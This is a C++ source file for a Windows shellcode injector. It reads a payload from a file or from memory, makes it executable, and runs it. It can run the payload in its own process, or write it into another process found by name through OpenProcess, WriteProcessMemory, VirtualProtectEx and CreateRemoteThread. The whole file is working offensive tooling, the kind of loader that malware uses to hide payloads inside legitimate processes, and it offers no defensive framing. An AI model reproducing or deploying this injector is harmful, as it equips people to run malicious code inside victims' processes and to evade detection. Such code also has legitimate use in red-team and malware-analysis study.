#include "Injector.h"
#include <cstdio>
#include <TlHelp32.h>

/**
    @brief : Function to retrieve the PE file content.
    @param  lpFilePath : : path of the file.
    @retval : : address of the content in the explorer memory.
**/
HANDLE Injector::GetFileContent(const LPSTR lpFilePath)
{
	const HANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("[-] An error occured when trying to open the file !\n");
		CloseHandle(hFile);
		return nullptr;
	}

	const DWORD dFileSize = GetFileSize(hFile, nullptr);
	if (dFileSize == INVALID_FILE_SIZE)
	{
		printf("[-] An error occured when trying to get the file size !\n");
		CloseHandle(hFile);
		return nullptr;
	}

	const HANDLE hFileContent = HeapAlloc(GetProcessHeap(), 0, dFileSize);
	if (hFileContent == INVALID_HANDLE_VALUE)
	{
		printf("[-] An error occured when trying to allocate memory for the file content !\n");
		CloseHandle(hFile);
		CloseHandle(hFileContent);
		return nullptr;
	}

	const BOOL bFileRead = ReadFile(hFile, hFileContent, dFileSize, nullptr, nullptr);
	if (!bFileRead)
	{
		printf("[-] An error occured when trying to read the file content !\n");

		CloseHandle(hFile);
		if (hFileContent != nullptr)
			HeapFree(GetProcessHeap(), 0, hFileContent);

		return nullptr;
	}

	CloseHandle(hFile);
	return hFileContent;
}

/**
    @brief : Function wich find the process id of the specified process.
    @param  lpProcessName : name of the target process. 
    @retval : the process id if the process is found else -1.
**/
DWORD Injector::GetProcessByName(const LPSTR lpProcessName)
{
	char lpCurrentProcessName[255];

	PROCESSENTRY32 ProcList{};
	ProcList.dwSize = sizeof(ProcList);

	const HANDLE hProcList = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcList == INVALID_HANDLE_VALUE)
		return -1;

	if (!Process32First(hProcList, &ProcList))
		return -1;

	wcstombs_s(nullptr, lpCurrentProcessName, ProcList.szExeFile, 255);

	if (lstrcmpA(lpCurrentProcessName, lpProcessName) == 0)
		return ProcList.th32ProcessID;

	while (Process32Next(hProcList, &ProcList))
	{
		wcstombs_s(nullptr, lpCurrentProcessName, ProcList.szExeFile, 255);

		if (lstrcmpA(lpCurrentProcessName, lpProcessName) == 0)
			return ProcList.th32ProcessID;
	}

	return -1;
}

/**
    @brief : Function that inject shellcode from a file into the current process.
    @param  lpFileName : Path of the file.
    @retval : TRUE if the injection succeed else FALSE.
**/
BOOL Injector::LocalInjectionFromFile(const LPCSTR lpFileName)
{
	printf("[+] LocalInjectionFromFile (File : %s)\n", lpFileName);

	const HANDLE hFileData = GetFileContent((LPSTR)lpFileName);
	if (hFileData == nullptr)
	{
		HeapFree(GetProcessHeap(), 0, hFileData);
		return FALSE;
	}

	printf("[+] File content at : 0x%X\n", ((LPVOID)hFileData));

	const SIZE_T stDataSize = HeapSize(GetProcessHeap(), NULL, hFileData);
	if (stDataSize == (SIZE_T)-1)
	{
		HeapFree(GetProcessHeap(), 0, hFileData);
		printf("[-] Error when retrieving shellcode size\n");
		return FALSE;
	}

	printf("[+] File size 0x%X\n", (DWORD64)stDataSize);

	const LPVOID lpShellcodeAlloc = VirtualAlloc(nullptr, stDataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpShellcodeAlloc == nullptr)
	{
		HeapFree(GetProcessHeap(), 0, hFileData);
		printf("[-] Error when allocating memory\n");
		return FALSE;
	}

	printf("[+] Memory allocation for shellcode at : 0x%X\n", lpShellcodeAlloc);

	const errno_t eCopyError = memcpy_s(lpShellcodeAlloc, stDataSize, hFileData, stDataSize);
	if (eCopyError)
	{
		HeapFree(GetProcessHeap(), 0, hFileData);
		VirtualFree(lpShellcodeAlloc, NULL, MEM_RELEASE);
		printf("[-] Error when copying shellcode\n");
		return FALSE;
	}

	printf("[+] Shellcode successfully copied\n");

	DWORD pOldProtect;
	const BOOL bChangeProtection = VirtualProtect(lpShellcodeAlloc, stDataSize, PAGE_EXECUTE_READ, &pOldProtect);
	if (bChangeProtection == 0)
	{
		HeapFree(GetProcessHeap(), 0, hFileData);
		VirtualFree(lpShellcodeAlloc, NULL, MEM_RELEASE);
		printf("[-] Error when changing memory protection\n");
		return FALSE;
	}

	printf("[+] Shellcode now executable\n");

	HeapFree(GetProcessHeap(), 0, hFileData);

	const HANDLE hShellcodeThread = CreateThread(nullptr, NULL, (LPTHREAD_START_ROUTINE)lpShellcodeAlloc, nullptr, NULL, nullptr);
	if (hShellcodeThread == nullptr)
	{
		VirtualFree(lpShellcodeAlloc, NULL, MEM_RELEASE);
		printf("[-] Error starting thread\n");
		return FALSE;
	}

	printf("[+] Thread created\n");

	WaitForSingleObject(hShellcodeThread, INFINITE);

	return TRUE;
}

/**
    @brief : Function that inject shellcode from memory into the current process.
    @param  lpShellcode : Address of the buffer containing the shellcode.
    @param  dShellcodeSize : Size of the shellcode.
    @retval : TRUE if the injection succeed else FALSE.
**/
BOOL Injector::LocalInjectionFromMemory(const LPVOID lpShellcode, const DWORD dShellcodeSize)
{
	printf("[+] LocalInjectionFromMemory (Address : 0x%X)\n", (LPVOID)lpShellcode);
	printf("[+] Shellcode size %d\n", (DWORD64)dShellcodeSize);

	DWORD pOldProtect;
	const BOOL bChangeProtection = VirtualProtect(lpShellcode, dShellcodeSize, PAGE_EXECUTE_READ, &pOldProtect);
	if (bChangeProtection == 0)
	{
		printf("[-] Error when changing memory protection\n");
		return FALSE;
	}

	printf("[+] Shellcode now executable\n");

	const HANDLE hShellcodeThread = CreateThread(nullptr, NULL, (LPTHREAD_START_ROUTINE)lpShellcode, nullptr, NULL, nullptr);
	if (hShellcodeThread == nullptr)
	{
		printf("[-] Error starting thread\n");
		return FALSE;
	}

	printf("[+] Thread created\n");

	WaitForSingleObject(hShellcodeThread, INFINITE);

	return TRUE;
}

/**
    @brief : Function that inject shellcode from a file into the target process.
    @param  lpFileName : Path to file.
    @param  lpProcessName : Name of the process. 
    @retval : TRUE if the injection succeed else FALSE.
**/
BOOL Injector::RemoteInjectionFromFile(const LPCSTR lpFileName, const LPCSTR lpProcessName)
{
	printf("[+] RemoteInjectionFromFile (File : %s | Process %s)\n", lpFileName, lpProcessName);

	const HANDLE hFileData = GetFileContent((LPSTR)lpFileName);
	if (hFileData == nullptr)
	{
		HeapFree(GetProcessHeap(), 0, hFileData);
		return FALSE;
	}

	printf("[+] File content at : 0x%X\n", (LPVOID)hFileData);

	const SIZE_T stDataSize = HeapSize(GetProcessHeap(), NULL, hFileData);
	if (stDataSize == (SIZE_T)-1)
	{
		HeapFree(GetProcessHeap(), 0, hFileData);
		printf("[-] Error when retrieving shellcode size\n");
		return FALSE;
	}

	printf("[+] File size 0x%X\n", (DWORD64)stDataSize);

	const DWORD dPID = GetProcessByName((LPSTR)lpProcessName);
	if (dPID == -1)
	{
		HeapFree(GetProcessHeap(), 0, hFileData);
		printf("[-] Error when retrieving process PID\n");
		return FALSE;
	}

	printf("[+] Target process PID : %d\n", dPID);

	const HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dPID);
	if (hTargetProcess == nullptr)
	{
		HeapFree(GetProcessHeap(), 0, hFileData);
		printf("[-] Error when opening target process\n");
		return FALSE;
	}

	printf("[+] Target process opened successfully\n");

	const LPVOID lpShellcodeAlloc = VirtualAllocEx(hTargetProcess, nullptr, stDataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpShellcodeAlloc == nullptr)
	{
		HeapFree(GetProcessHeap(), 0, hFileData);
		printf("[-] Error when allocating memory\n");
		return FALSE;
	}

	printf("[+] Memory allocation for shellcode at : 0x%X\n", lpShellcodeAlloc);

	const BOOL bShellcodeWrite = WriteProcessMemory(hTargetProcess, lpShellcodeAlloc, hFileData, stDataSize, nullptr);
	if (bShellcodeWrite == 0)
	{
		HeapFree(GetProcessHeap(), 0, hFileData);
		VirtualFreeEx(hTargetProcess, lpShellcodeAlloc, NULL, MEM_RELEASE);
		printf("[-] Error when writing the shellcode into the target process\n");
		return FALSE;
	}

	printf("[+] Shellcode successfully copied\n");

	DWORD pOldProtect;
	const BOOL bChangeProtection = VirtualProtectEx(hTargetProcess, lpShellcodeAlloc, stDataSize, PAGE_EXECUTE_READ, &pOldProtect);
	if (bChangeProtection == 0)
	{
		HeapFree(GetProcessHeap(), 0, hFileData);
		VirtualFreeEx(hTargetProcess, lpShellcodeAlloc, NULL, MEM_RELEASE);
		printf("[-] Error when modifying memory protection\n");
		return FALSE;
	}

	printf("[+] Shellcode now executable\n");

	HeapFree(GetProcessHeap(), 0, hFileData);

	printf("[+] File content has been released\n");

	const HANDLE hShellcodeThread = CreateRemoteThread(hTargetProcess, nullptr, NULL, (LPTHREAD_START_ROUTINE)lpShellcodeAlloc, nullptr, NULL, nullptr);
	if (hShellcodeThread == nullptr)
	{
		VirtualFreeEx(hTargetProcess, lpShellcodeAlloc, NULL, MEM_RELEASE);
		printf("[-] Error when starting the thread\n");
		return FALSE;
	}

	printf("[+] Thread created\n");

	return TRUE;
}

/**
    @brief : Function that inject shellcode from memory into the target process.
    @param  lpShellcode : Address of the buffer containing the shellcode.
    @param  dShellcodeSize : Size of the shellcode.
    @param  lpProcessName : Name of the process.
    @retval : TRUE if the injection succeed else FALSE.
**/
BOOL Injector::RemoteInjectionFromMemory(const LPVOID lpShellcode, const DWORD dShellcodeSize, const LPCSTR lpProcessName)
{
	printf("[+] RemoteInjectionFromMemory (Address : 0x%X | Size : %d | Process %s)\n", lpShellcode, dShellcodeSize, lpProcessName);

	const DWORD dPID = GetProcessByName((LPSTR)lpProcessName);
	if (dPID == -1)
	{
		printf("[-] Error when retrieving process PID\n");
		return FALSE;
	}

	printf("[+] Target process PID : %d\n", dPID);

	const HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dPID);
	if (hTargetProcess == nullptr)
	{
		printf("[-] Error when opening target process\n");
		return FALSE;
	}

	printf("[+] Target process opened successfully\n");

	const LPVOID lpShellcodeAlloc = VirtualAllocEx(hTargetProcess, nullptr, dShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpShellcodeAlloc == nullptr)
	{
		printf("[-] Error when allocating memory\n");
		return FALSE;
	}

	printf("[+] Memory allocation for shellcode at : 0x%X\n", lpShellcodeAlloc);

	const BOOL bShellcodeWrite = WriteProcessMemory(hTargetProcess, lpShellcodeAlloc, lpShellcode, dShellcodeSize, nullptr);
	if (bShellcodeWrite == 0)
	{
		VirtualFreeEx(hTargetProcess, lpShellcodeAlloc, NULL, MEM_RELEASE);
		printf("[-] Error when writing the shellcode into the target process\n");
		return FALSE;
	}

	printf("[+] Shellcode successfully copied\n");

	DWORD pOldProtect;
	const BOOL bChangeProtection = VirtualProtectEx(hTargetProcess, lpShellcodeAlloc, dShellcodeSize, PAGE_EXECUTE_READ, &pOldProtect);
	if (bChangeProtection == 0)
	{
		VirtualFreeEx(hTargetProcess, lpShellcodeAlloc, NULL, MEM_RELEASE);
		printf("[-] Error when modifying memory protection\n");
		return FALSE;
	}

	printf("[+] Shellcode now executable\n");

	const HANDLE hShellcodeThread = CreateRemoteThread(hTargetProcess, nullptr, NULL, (LPTHREAD_START_ROUTINE)lpShellcodeAlloc, nullptr, NULL, nullptr);
	if (hShellcodeThread == nullptr)
	{
		VirtualFreeEx(hTargetProcess, lpShellcodeAlloc, NULL, MEM_RELEASE);
		printf("[-] Error when starting the thread\n");
		return FALSE;
	}

	printf("[+] Thread created\n");

	return TRUE;
}
